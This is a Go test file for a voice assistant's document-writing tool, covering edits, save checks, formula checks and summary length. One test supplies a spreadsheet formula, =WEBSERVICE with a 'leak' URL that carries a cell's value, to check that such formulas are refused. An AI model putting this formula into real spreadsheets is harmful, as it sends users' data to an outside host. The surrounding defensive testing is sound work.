package cc

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"testing"

	"github.com/alexberardi/jarvis-server/internal/modules/cc/errands"
	"github.com/alexberardi/jarvis-server/internal/modules/cc/prompts"
	"github.com/alexberardi/jarvis-server/internal/modules/cc/servertools"
	"github.com/alexberardi/jarvis-server/internal/platform/settings"
)

// fakeDocAgent is the agent's computer_files doc ops: a file at most, its paragraphs, and an
// edit that appends what it is given (dropText: a save that loses the text).
type fakeDocAgent struct {
	mu       sync.Mutex
	exists   bool
	paras    []any
	ops      []map[string]any
	dropText bool
	editErr  map[string]any
	files    map[string]map[string]any // other files by path, read as they are
	page     map[string]any            // browser_read_page's answer: the page open in the browser
	reads    int                       // browser_read_page calls
	readTab  any                       // the tab_id the last read asked for
	tabs     []any                     // browser_list_tabs' tabs (nil: one current tab, chrome:7)
}

func (f *fakeDocAgent) call(_ context.Context, _, tool string, args map[string]any, _ int64) map[string]any {
	f.mu.Lock()
	defer f.mu.Unlock()
	if tool == "browser_list_tabs" {
		tabs := f.tabs
		if tabs == nil {
			tabs = []any{map[string]any{"tab_id": "chrome:3", "current": false}, map[string]any{"tab_id": "chrome:7", "current": true}}
		}
		return map[string]any{"success": true, "tabs": tabs}
	}
	if tool == "browser_read_page" {
		f.reads++
		f.readTab = args["tab_id"]
		if f.page == nil {
			return map[string]any{"success": false, "error": "no browser"}
		}
		return f.page
	}
	f.ops = append(f.ops, args)
	if out, ok := f.files[args["path"].(string)]; ok {
		return out
	}
	switch args["op"] {
	case "doc_read":
		if !f.exists {
			return map[string]any{"success": false, "error_code": "not_found", "error": "no file"}
		}
		return map[string]any{"success": true, "path": "/home/avery/Documents/apollo.odt", "kind": "text", "text": f.paras}
	case "doc_edit":
		if f.editErr != nil {
			return f.editErr
		}
		out := map[string]any{"success": true, "path": "/home/avery/Documents/apollo.odt"}
		if f.exists {
			out["backup"] = "/home/avery/Documents/Jarvis/Backups/apollo-1.odt"
		}
		f.exists = true
		for _, o := range args["ops"].([]any) {
			om := o.(map[string]any)
			if om["op"] == "append" && !f.dropText {
				style, _ := om["style"].(string)
				for _, line := range strings.Split(om["text"].(string), "\n") {
					f.paras = append(f.paras, map[string]any{"style": style, "text": line})
				}
			}
		}
		return out
	}
	return map[string]any{"success": false, "error": "unexpected op"}
}

func TestWriteDocument(t *testing.T) {
	agent := &fakeDocAgent{}
	fetch := &fakeWatchFetcher{status: 200, body: `<main><h1>Apollo 11</h1><p>Apollo 11 landed on July 20, 1969.</p></main>`}
	ve := newVoiceEnv(t, prompts.Qwen3_8B, func(m *Module) { m.recordingAgent, m.WatchFetcher = agent.call, fetch })
	ve.setComputerControl("on")
	tool := &writeDocumentTool{m: ve.m}
	edits := func(ops ...map[string]any) {
		b, _ := json.Marshal(map[string]any{"ops": ops})
		ve.eng.say(string(b))
	}

	// A new document from a source page: created, then checked in the saved file.
	edits(map[string]any{"op": "append", "style": "Title", "text": "Apollo 11"},
		map[string]any{"op": "append", "text": "It landed on July 20, 1969.\nArmstrong walked first."})
	out := runTool(t, tool, `{"path": "apollo.odt", "instructions": "a one-page summary", "source": "https://en.wikipedia.org/wiki/Apollo_11"}`, ve.recTurn(7))
	if out["status"] != "saved" || out["created"] != true || out["path"] != "/home/avery/Documents/apollo.odt" ||
		!strings.Contains(out["message"].(string), "checked in the saved file") {
		t.Fatalf("create: %v", out)
	}
	if a := agent.ops[1]; a["op"] != "doc_edit" || a["path"] != "~/Documents/apollo.odt" || a["create"] != true {
		t.Fatalf("edit call: %v", a)
	}
	prompt := lastUserText(t, ve.eng.last())
	if !strings.Contains(prompt, "landed on July 20, 1969") || !strings.Contains(prompt, "new, empty text document") ||
		!strings.Contains(prompt, "<<<PAGE") {
		t.Fatalf("prompt:\n%s", prompt)
	}

	// An edit: the model sees the document as it is; the backup is reported.
	edits(map[string]any{"op": "append", "style": "Heading 1", "text": "Crew"})
	out = runTool(t, tool, `{"path": "~/Documents/apollo.odt", "instructions": "add a Crew heading"}`, ve.recTurn(7))
	if out["created"] != false || out["backup"] != "/home/avery/Documents/Jarvis/Backups/apollo-1.odt" {
		t.Fatalf("edit: %v", out)
	}
	if p := lastUserText(t, ve.eng.last()); !strings.Contains(p, "[Title] Apollo 11") || !strings.Contains(p, "Armstrong walked first.") {
		t.Fatalf("edit prompt:\n%s", p)
	}

	// A save that doesn't hold what was written fails the step: the model's word isn't enough.
	agent.dropText = true
	edits(map[string]any{"op": "append", "text": "Aldrin followed."})
	out = runTool(t, tool, `{"path": "~/Documents/apollo.odt", "instructions": "add Aldrin"}`, ve.recTurn(7))
	if out["error"] != "verify_failed" || !strings.Contains(out["message"].(string), "Aldrin followed.") {
		t.Fatalf("unchecked save: %v", out)
	}
	agent.dropText = false

	// The agent refusing (open in LibreOffice) is said; a bad type never reaches it.
	agent.editErr = map[string]any{"success": false, "error_code": "file_open", "error": "apollo.odt is open in LibreOffice: close it first"}
	edits(map[string]any{"op": "append", "text": "x"})
	if out := runTool(t, tool, `{"path": "apollo.odt", "instructions": "x"}`, ve.recTurn(7)); out["error"] != "file_open" {
		t.Fatalf("open file: %v", out)
	}
	n := len(agent.ops)
	if out := runTool(t, tool, `{"path": "notes.txt", "instructions": "x"}`, ve.recTurn(7)); out["error"] != "invalid_argument" || len(agent.ops) != n {
		t.Fatalf("txt: %v", out)
	}
}

func lastUserText(t *testing.T, req map[string]any) string {
	t.Helper()
	msgs, _ := req["messages"].([]any)
	for i := len(msgs) - 1; i >= 0; i-- {
		m, _ := msgs[i].(map[string]any)
		if m["role"] != "user" {
			continue
		}
		if s, ok := m["content"].(string); ok {
			return s
		}
		b, _ := json.Marshal(m["content"])
		return string(b)
	}
	t.Fatal("no user message")
	return ""
}

// The saved document as text, and the check of each edit against it.
func TestMissingEdits(t *testing.T) {
	saved := renderDoc(map[string]any{"sheets": []any{map[string]any{"name": "Budget", "rows": []any{
		[]any{"Item", "Cost"}, []any{"Rent", "1200"}, []any{"", "=SUM(B2:B2)"}}}}})
	if saved != "Sheet Budget\nA1=Item\tB1=Cost\nA2=Rent\tB2=1200\nB3==SUM(B2:B2)" {
		t.Fatalf("rendered %q", saved)
	}
	ok := []any{
		map[string]any{"op": "add_sheet", "name": "Budget"},
		map[string]any{"op": "append_row", "values": []any{"Rent", 1200.0}},
		map[string]any{"op": "set", "cell": "b3", "value": "=SUM(B2:B2)"},
	}
	if m := missingEdits(ok, saved); m != "" {
		t.Fatalf("missing %s", m)
	}
	if m := missingEdits([]any{map[string]any{"op": "append_row", "values": []any{"Food", 400.5}}}, saved); m != `edit 1 ("Food")` {
		t.Fatalf("missing %q", m)
	}
	if colName(0) != "A" || colName(25) != "Z" || colName(26) != "AA" {
		t.Fatal("column names")
	}
}

// Words as the source read the top results; earlier steps' results are material too; Markdown
// the model writes anyway is stripped.
func TestWriteDocumentMaterial(t *testing.T) {
	agent := &fakeDocAgent{}
	fetch := &fakeWatchFetcher{status: 200, body: `<main><p>The landing was filmed live.</p></main>`}
	search := &fakeWatchSearcher{results: []servertools.SearchResult{
		{URL: "https://a.example/1"}, {URL: "https://b.example/2"}, {URL: "https://c.example/3"}, {URL: "https://d.example/4"}}}
	ve := newVoiceEnv(t, prompts.Qwen3_8B, func(m *Module) {
		m.recordingAgent, m.WatchFetcher, m.WebSearch = agent.call, fetch, search
	})
	ve.setComputerControl("on")
	ve.set(settingWebSearch, true, settings.Scope{HouseholdID: voiceHH})
	b, _ := json.Marshal(map[string]any{"ops": []any{map[string]any{"op": "append", "style": "Heading 1", "text": "## **Claims**\nThe **footage** was live."}}})
	ve.eng.say(string(b))
	turn := ve.recTurn(7)
	turn.Utterance = "deep research the moon landing hoax claims into a document"
	turn.Prior = `- Search prices: 3 results` + "\n  " + `{"answer": "Kodak film costs $9"}`
	out := runTool(t, tool(ve), `{"path": "hoax.odt", "instructions": "a summary", "source": "moon landing hoax claims"}`, turn)
	if out["status"] != "saved" {
		t.Fatalf("saved: %v", out)
	}
	if srcs, _ := out["sources"].([]any); len(srcs) != 3 || len(fetch.urls) != 3 {
		t.Fatalf("sources %v, fetched %v", out["sources"], fetch.urls)
	}
	p := lastUserText(t, ve.eng.last())
	for _, want := range []string{"https://c.example/3", "filmed live", "Kodak film costs $9", "The user asked: deep research"} {
		if !strings.Contains(p, want) {
			t.Errorf("prompt lacks %q:\n%s", want, p)
		}
	}
	ops := agent.ops[1]["ops"].([]any)
	if got := ops[0].(map[string]any)["text"]; got != "Claims\nThe footage was live." {
		t.Fatalf("markdown kept: %q", got)
	}
}

// "This page" is the page open in the user's browser, read by the agent's extension: neither an
// address the server fetches (a page behind the user's login, or on their own network) nor
// words to search for (T1, PLAN-computer-use.md task 6: the planner passed the page's name, web
// search was off, and the errand failed without reading it).
func TestWriteDocumentOpenPage(t *testing.T) {
	page := map[string]any{"success": true, "chars": 40,
		"tab":     map[string]any{"url": "http://192.168.1.20/wiki/Velmora", "title": "Velmora - Test Wiki"},
		"content": "<<<PAGE TEXT: untrusted>>>\nVelmora is a town on Lake Orrin, founded in 1287.\n<<<END PAGE TEXT>>>"}
	for _, c := range []struct {
		name, utterance, args string
		reads                 int
	}{
		{"source says so", "summarize it into a document", `{"path": "Velmora.odt", "instructions": "a summary", "source": "the page open in my browser"}`, 1},
		{"the request says so", "Summarize this wiki page into a LibreOffice document called Velmora", `{"path": "Velmora.odt", "instructions": "a summary", "source": "Velmora wiki page"}`, 1},
		{"no source", "Summarize the article I have open into a document", `{"path": "Velmora.odt", "instructions": "a summary"}`, 1},
		{"an address is fetched", "Summarize this page into a document", `{"path": "Velmora.odt", "instructions": "a summary", "source": "https://a.example/velmora"}`, 0},
	} {
		t.Run(c.name, func(t *testing.T) {
			agent := &fakeDocAgent{page: page}
			fetch := &fakeWatchFetcher{status: 200, body: `<main><p>Velmora is a town on Lake Orrin, founded in 1287.</p></main>`}
			ve := newVoiceEnv(t, prompts.Qwen3_8B, func(m *Module) { m.recordingAgent, m.WatchFetcher = agent.call, fetch })
			ve.setComputerControl("on")
			b, _ := json.Marshal(map[string]any{"ops": []any{map[string]any{"op": "append", "text": "Velmora: a lake town founded in 1287."}}})
			ve.eng.say(string(b))
			turn := ve.recTurn(7)
			turn.Utterance = c.utterance
			out := runTool(t, tool(ve), c.args, turn)
			if out["status"] != "saved" {
				t.Fatalf("saved: %v", out)
			}
			if agent.reads != c.reads {
				t.Fatalf("read the open page %d times, want %d", agent.reads, c.reads)
			}
			// The tab in front, by its id: without one the agent reads its task tab, where an
			// earlier errand worked (checkpoint B: a store's checkout summarized as Velmora).
			if c.reads > 0 && agent.readTab != "chrome:7" {
				t.Fatalf("read tab %v, want the current tab chrome:7", agent.readTab)
			}
			p := lastUserText(t, ve.eng.last())
			if !strings.Contains(p, "Lake Orrin") {
				t.Errorf("prompt lacks the page:\n%s", p)
			}
			want := "https://a.example/velmora"
			if c.reads > 0 {
				want = "http://192.168.1.20/wiki/Velmora"
			}
			if srcs, _ := out["sources"].([]any); len(srcs) != 1 || srcs[0] != want {
				t.Errorf("sources %v, want %s", out["sources"], want)
			}
		})
	}
}

// No web page open in the browser: the step fails saying so, and writes nothing. Only the
// Jarvis page open is the same: it is the chat, never the page meant (a single other tab that
// isn't in front is read: TestPickOpenTab).
func TestWriteDocumentOpenPageMissing(t *testing.T) {
	none := &fakeDocAgent{tabs: []any{map[string]any{"tab_id": "chrome:3", "current": true, "jarvis_page": true}}, page: map[string]any{"success": true}}
	vn := newVoiceEnv(t, prompts.Qwen3_8B, func(m *Module) { m.recordingAgent = none.call })
	vn.setComputerControl("on")
	tn := vn.recTurn(7)
	tn.Utterance = "summarize this page into a document"
	if out := runTool(t, tool(vn), `{"path": "x.odt", "instructions": "a summary"}`, tn); !strings.Contains(fmt.Sprint(out["message"]), "no web page open") || none.reads != 0 {
		t.Fatalf("no current tab: %v (reads %d)", out, none.reads)
	}

	agent := &fakeDocAgent{page: map[string]any{"success": true, "tab": map[string]any{"url": "chrome://newtab/"}, "content": "<<<PAGE TEXT>>>\n\n<<<END PAGE TEXT>>>"}}
	ve := newVoiceEnv(t, prompts.Qwen3_8B, func(m *Module) { m.recordingAgent = agent.call })
	ve.setComputerControl("on")
	turn := ve.recTurn(7)
	turn.Utterance = "summarize this page into a document"
	out := runTool(t, tool(ve), `{"path": "x.odt", "instructions": "a summary"}`, turn)
	if out["status"] == "saved" || !strings.Contains(fmt.Sprint(out["message"]), "no web page open") {
		t.Fatalf("want a refusal naming the missing page: %v", out)
	}
	for _, op := range agent.ops {
		if op["op"] == "doc_edit" {
			t.Fatal("wrote a document without its source")
		}
	}
}

// An errand's earlier step saved files (an email's attachments): write_document reads them as
// material, office files through doc_read and text through read; others are only named.
func TestWriteDocumentPriorFiles(t *testing.T) {
	const dir = "/home/avery/Documents/Jarvis/Attachments/2026-10-30 Timesheet/"
	agent := &fakeDocAgent{files: map[string]map[string]any{
		dir + "hours.xlsx": {"success": true, "kind": "sheet", "sheets": []any{map[string]any{"name": "Hours",
			"rows": []any{[]any{"Week", "Hours"}, []any{"44", 38.5}}}}},
		dir + "notes.csv": {"success": true, "text": "day,hours\nMon,7.5\n"},
		dir + "scan.pdf":  {"success": false, "error": "not reached"},
	}}
	ve := newVoiceEnv(t, prompts.Qwen3_8B, func(m *Module) { m.recordingAgent = agent.call })
	ve.setComputerControl("on")
	b, _ := json.Marshal(map[string]any{"ops": []any{map[string]any{"op": "append", "text": "Total: 38.5 hours"}}})
	ve.eng.say(string(b))
	turn := ve.recTurn(7)
	turn.PriorFiles = []string{dir + "hours.xlsx", dir + "notes.csv", dir + "scan.pdf"}
	out := runTool(t, tool(ve), `{"path": "totals.odt", "instructions": "total the hours"}`, turn)
	if out["status"] != "saved" {
		t.Fatalf("saved: %v", out)
	}
	p := lastUserText(t, ve.eng.last())
	for _, want := range []string{"File hours.xlsx", "B2=38.5", "Mon,7.5", "File scan.pdf", "can't read .pdf files yet"} {
		if !strings.Contains(p, want) {
			t.Errorf("prompt lacks %q:\n%s", want, p)
		}
	}
	for _, op := range agent.ops {
		if op["path"] == dir+"scan.pdf" {
			t.Fatal("a PDF was sent to the agent")
		}
	}
}

func tool(ve *voiceEnv) *writeDocumentTool { return &writeDocumentTool{m: ve.m} }

// A bare file name goes in the documents folder setting.
func TestWriteDocumentFolderSetting(t *testing.T) {
	agent := &fakeDocAgent{}
	ve := newVoiceEnv(t, prompts.Qwen3_8B, func(m *Module) { m.recordingAgent = agent.call })
	ve.setComputerControl("on")
	ve.set(errands.SettingDocumentsFolder, "~/Documents/Jarvis/", settings.Scope{})
	ve.eng.say(`{"ops": [{"op": "append", "text": "hi"}]}`)
	runTool(t, tool(ve), `{"path": "a.odt", "instructions": "hi"}`, ve.recTurn(7))
	if p := agent.ops[0]["path"]; p != "~/Documents/Jarvis/a.odt" {
		t.Fatalf("path %v", p)
	}
}

// A formula over empty cells is caught before saving (C29: the moons were in B, the total
// summed C2:C11), and only real cell refs count.
func TestEmptyFormulaRef(t *testing.T) {
	rows := func(total string) []any {
		ops := []any{map[string]any{"op": "add_sheet", "name": "Planets"},
			map[string]any{"op": "append_row", "sheet": "Planets", "values": []any{"Category", "Total"}}}
		for _, r := range []any{[]any{"Mercury", 0.0}, []any{"Earth", 1.0}, []any{"Saturn", 146.0}} {
			ops = append(ops, map[string]any{"op": "append_row", "sheet": "Planets", "values": r})
		}
		return append(ops, map[string]any{"op": "set", "sheet": "Planets", "cell": "B10", "value": total})
	}
	if got := emptyFormulaRef(rows("=SUM(C2:C11)"), "", false); got != "=SUM(C2:C11) in Planets!B10 refers to C2:C11, which is empty" {
		t.Fatalf("bad column: %q", got)
	}
	for _, ok := range []string{"=SUM(B2:B9)", "=SUM($B$2:$B$4)", "=B2+B3", "=LOG10(B4)", "=Other!C2", "Total", ""} {
		if got := emptyFormulaRef(rows(ok), "", false); got != "" {
			t.Errorf("%q flagged: %s", ok, got)
		}
	}
	// No sheet named: the first. A formula in an appended row is checked too; its own cell doesn't count.
	ops := []any{map[string]any{"op": "append_row", "values": []any{"x", 5.0}},
		map[string]any{"op": "append_row", "values": []any{"total", "=SUM(C1:C1)"}}}
	if got := emptyFormulaRef(ops, "", false); !strings.Contains(got, "Sheet1!B2") {
		t.Fatalf("appended formula: %q", got)
	}
	self := []any{map[string]any{"op": "set", "cell": "A1", "value": "=SUM(A1:A1)"}}
	if emptyFormulaRef(self, "", false) == "" {
		t.Fatal("a formula over only itself passed")
	}
	// An existing workbook's cells count, as renderDoc shows them.
	current := "Sheet Budget\nA1=Item\tB1=Cost\nA2=Rent\tB2=1200"
	set := []any{map[string]any{"op": "set", "cell": "B3", "value": "=SUM(B2:B2)"}}
	if got := emptyFormulaRef(set, current, true); got != "" {
		t.Fatalf("existing cells: %q", got)
	}
	set[0].(map[string]any)["value"] = "=SUM(D2:D2)"
	if emptyFormulaRef(set, current, true) == "" {
		t.Fatal("an empty column in an existing workbook passed")
	}
}

// A bad formula gets one more try with what was wrong; an answer wrapped in a JSON string is read.
func TestDocumentEditsRetriesAFormula(t *testing.T) {
	ve := newVoiceEnv(t, prompts.Qwen3_8B)
	bad, _ := json.Marshal(map[string]any{"ops": []any{
		map[string]any{"op": "append_row", "values": []any{"Saturn", 146}},
		map[string]any{"op": "set", "cell": "B2", "value": "=SUM(C1:C1)"}}})
	good, _ := json.Marshal(map[string]any{"ops": []any{
		map[string]any{"op": "append_row", "values": []any{"Saturn", 146}},
		map[string]any{"op": "set", "cell": "B2", "value": "=SUM(B1:B1)"}}})
	wrapped, _ := json.Marshal(string(good))
	ve.eng.say(string(bad))
	ve.eng.say(string(wrapped))
	ops, err := ve.m.documentEdits(context.Background(), "total the moons", "total the moons", true, "", false, "")
	if err != nil || len(ops) != 2 || ops[1].(map[string]any)["value"] != "=SUM(B1:B1)" {
		t.Fatalf("ops %v, %v", ops, err)
	}
	if p := lastUserText(t, ve.eng.last()); !strings.Contains(p, "=SUM(C1:C1) in Sheet1!B2 refers to C1:C1, which is empty") {
		t.Fatalf("retry prompt lacks the problem:\n%s", p)
	}
}

// A total the model typed in is sent back once for a formula (C29: 385 for moons adding to 285).
func TestDocumentEditsWantsAFormulaForATotal(t *testing.T) {
	ve := newVoiceEnv(t, prompts.Qwen3_8B)
	typed, _ := json.Marshal(map[string]any{"ops": []any{
		map[string]any{"op": "append_row", "values": []any{"Saturn", 146}},
		map[string]any{"op": "append_row", "values": []any{"Total", 385}}}})
	formula, _ := json.Marshal(map[string]any{"ops": []any{
		map[string]any{"op": "append_row", "values": []any{"Saturn", 146}},
		map[string]any{"op": "append_row", "values": []any{"Total", "=SUM(B1:B1)"}}}})
	ve.eng.say(string(typed))
	ve.eng.say(string(formula))
	ops, err := ve.m.documentEdits(context.Background(), "total the moons in it", "a spreadsheet of the moons", true, "", false, "")
	if err != nil || !hasFormula(ops) {
		t.Fatalf("ops %v, %v", ops, err)
	}
	if p := lastUserText(t, ve.eng.last()); !strings.Contains(p, "no cell has a formula") {
		t.Fatalf("retry prompt:\n%s", p)
	}
	// No total asked for: numbers alone are fine, first try.
	ve.eng.say(string(typed))
	if _, err := ve.m.documentEdits(context.Background(), "list the moons", "a spreadsheet of the moons", true, "", false, ""); err != nil {
		t.Fatal(err)
	}
}

// Work on files the errand just saved never edits an earlier result with the same name (C29: a
// second run edited the first's totals sheet and left two Total rows).
func TestWriteDocumentPriorFilesGetANewFile(t *testing.T) {
	agent := &fakeDocAgent{exists: true, paras: []any{map[string]any{"text": "old totals"}},
		files: map[string]map[string]any{"~/Documents/totals (2).odt": {"success": false, "error_code": "not_found", "error": "no file"},
			"/home/avery/Documents/Jarvis/Attachments/x/planets.odt": {"success": true, "kind": "text", "text": []any{map[string]any{"text": "Saturn 146"}}}}}
	ve := newVoiceEnv(t, prompts.Qwen3_8B, func(m *Module) { m.recordingAgent = agent.call })
	ve.setComputerControl("on")
	b, _ := json.Marshal(map[string]any{"ops": []any{map[string]any{"op": "append", "text": "Saturn has 146"}}})
	ve.eng.say(string(b))
	turn := ve.recTurn(7)
	turn.PriorFiles = []string{"/home/avery/Documents/Jarvis/Attachments/x/planets.odt"}
	runTool(t, tool(ve), `{"path": "~/Documents/totals.odt", "instructions": "summarize"}`, turn)
	var edit map[string]any
	for _, op := range agent.ops {
		if op["op"] == "doc_edit" {
			edit = op
		}
	}
	if edit == nil || edit["path"] != "~/Documents/totals (2).odt" || edit["create"] != true {
		t.Fatalf("edit %v", edit)
	}
	// Without saved files, the named file is edited as before.
	agent2 := &fakeDocAgent{exists: true, paras: []any{map[string]any{"text": "old"}}}
	ve2 := newVoiceEnv(t, prompts.Qwen3_8B, func(m *Module) { m.recordingAgent = agent2.call })
	ve2.setComputerControl("on")
	ve2.eng.say(string(b))
	runTool(t, tool(ve2), `{"path": "~/Documents/totals.odt", "instructions": "add a line"}`, ve2.recTurn(7))
	if p := agent2.ops[1]["path"]; agent2.ops[1]["op"] != "doc_edit" || p != "~/Documents/totals.odt" {
		t.Fatalf("plain edit %v", agent2.ops[1])
	}
}

// An edit of a sheet nobody added gets its add_sheet first (C29: rows into "Planets" in a new
// workbook were refused); sheets the workbook has, or that an edit adds, are left alone.
func TestAddMissingSheets(t *testing.T) {
	row := func(sh string) map[string]any {
		return map[string]any{"op": "append_row", "sheet": sh, "values": []any{"x"}}
	}
	names := func(ops []any) string {
		var out []string
		for _, o := range ops {
			om := o.(map[string]any)
			out = append(out, fmt.Sprintf("%v:%v%v", om["op"], om["sheet"], om["name"]))
		}
		return strings.Join(out, " ")
	}
	got := addMissingSheets([]any{row("Planets"), row("Planets"), map[string]any{"op": "set", "cell": "B2", "value": 1}}, "", false)
	if names(got) != "add_sheet:<nil>Planets append_row:Planets<nil> append_row:Planets<nil> set:<nil><nil>" {
		t.Fatalf("new workbook: %s", names(got))
	}
	added := []any{map[string]any{"op": "add_sheet", "name": "Planets"}, row("Planets")}
	if len(addMissingSheets(added, "", false)) != 2 {
		t.Fatal("an added sheet was added twice")
	}
	if len(addMissingSheets([]any{row("Budget")}, "Sheet Budget\nA1=x", true)) != 1 {
		t.Fatal("an existing sheet was added")
	}
	// The added sheet counts for the formula check.
	ops := addMissingSheets([]any{row("Planets"), map[string]any{"op": "set", "sheet": "Planets", "cell": "B2", "value": "=SUM(A1:A1)"}}, "", false)
	if got := emptyFormulaRef(ops, "", false); got != "" {
		t.Fatalf("formula on the added sheet: %q", got)
	}
}

// A new spreadsheet worked out from one the errand saved starts as a copy of it: the model sees
// its cells as the sheet as it is, and the edit names it as from (C29).
func TestWriteDocumentStartsFromTheSavedSheet(t *testing.T) {
	const att = "/home/avery/Documents/Jarvis/Attachments/x/planets.xlsx"
	agent := &fakeDocAgent{files: map[string]map[string]any{att: {"success": true, "kind": "sheet",
		"sheets": []any{map[string]any{"name": "Planets", "rows": []any{[]any{"Planet", "Moons"}, []any{"Saturn", 146.0}}}}}}}
	ve := newVoiceEnv(t, prompts.Qwen3_8B, func(m *Module) { m.recordingAgent = agent.call })
	ve.setComputerControl("on")
	b, _ := json.Marshal(map[string]any{"ops": []any{
		map[string]any{"op": "append_row", "sheet": "Planets", "values": []any{"Total", "=SUM(B2:B2)"}}}})
	ve.eng.say(string(b))
	turn := ve.recTurn(7)
	turn.PriorFiles = []string{att}
	runTool(t, tool(ve), `{"path": "~/Documents/totals.xlsx", "instructions": "total the moons"}`, turn)
	var edit map[string]any
	for _, op := range agent.ops {
		if op["op"] == "doc_edit" {
			edit = op
		}
	}
	if edit == nil || edit["from"] != att || edit["create"] != true || edit["path"] != "~/Documents/totals.xlsx" {
		t.Fatalf("edit %v", edit)
	}
	// No add_sheet was put in: Planets is the copy's own sheet.
	if ops := edit["ops"].([]any); len(ops) != 1 {
		t.Fatalf("ops %v", ops)
	}
	if p := lastUserText(t, ve.eng.last()); !strings.Contains(p, "spreadsheet as it is now") || !strings.Contains(p, "B2=146") {
		t.Fatalf("prompt:\n%s", p)
	}
}

// A formula that could read another file or the network never reaches the agent (PR #547
// review C1): it is sent back with the reason, and the step fails if the model keeps it.
func TestDocumentEditsRefuseALeakingFormula(t *testing.T) {
	ve := newVoiceEnv(t, prompts.Qwen3_8B)
	leak, _ := json.Marshal(map[string]any{"ops": []any{
		map[string]any{"op": "append_row", "values": []any{"Saturn", 146}},
		map[string]any{"op": "set", "cell": "B2", "value": `=WEBSERVICE("http://127.0.0.1/leak?"&A1)`}}})
	for range 4 { // two tries on background, two on live
		ve.eng.say(string(leak))
	}
	ops, err := ve.m.documentEdits(context.Background(), "total the moons", "total the moons", true, "", false, "")
	if err == nil || ops != nil || !strings.Contains(err.Error(), "not WEBSERVICE") {
		t.Fatalf("ops %v, %v", ops, err)
	}
	if p := lastUserText(t, ve.eng.last()); !strings.Contains(p, "may use only") {
		t.Fatalf("retry prompt lacks the reason:\n%s", p)
	}
}

// A summary as long as its material is the material rewritten (T1 on Sonnet 5.5: 523 words from
// a 560-word page): sent back once with the counts; a short one passes, and a task that isn't a
// summary may run as long as it likes.
func TestDocumentEditsWantsASummaryShorter(t *testing.T) {
	page := strings.Repeat("Velmora lies on Lake Orrin and was founded in 1287 by salt traders. ", 30) // 360 words
	long, _ := json.Marshal(map[string]any{"ops": []any{map[string]any{"op": "append", "text": page[:len(page)*9/10]}}})
	short, _ := json.Marshal(map[string]any{"ops": []any{map[string]any{"op": "append", "text": "Velmora is a lake town founded by salt traders in 1287."}}})

	ve := newVoiceEnv(t, prompts.Qwen3_8B)
	ve.eng.say(string(long))
	ve.eng.say(string(short))
	ops, err := ve.m.documentEdits(context.Background(), "Summarize this page into a document", "a summary of the page", false, "", false, "Source: x\n"+page)
	if err != nil || len(ops) != 1 || !strings.HasPrefix(ops[0].(map[string]any)["text"].(string), "Velmora is a lake town") {
		t.Fatalf("ops %v, %v", ops, err)
	}
	if p := lastUserText(t, ve.eng.last()); !strings.Contains(p, "is not a summary") {
		t.Fatalf("retry prompt lacks the problem:\n%s", p)
	}

	ve = newVoiceEnv(t, prompts.Qwen3_8B)
	ve.eng.say(string(long))
	ops, err = ve.m.documentEdits(context.Background(), "Write up this page as a document", "the page as a document", false, "", false, "Source: x\n"+page)
	if err != nil || len(ops) != 1 {
		t.Fatalf("not a summary: ops %v, %v", ops, err)
	}
}
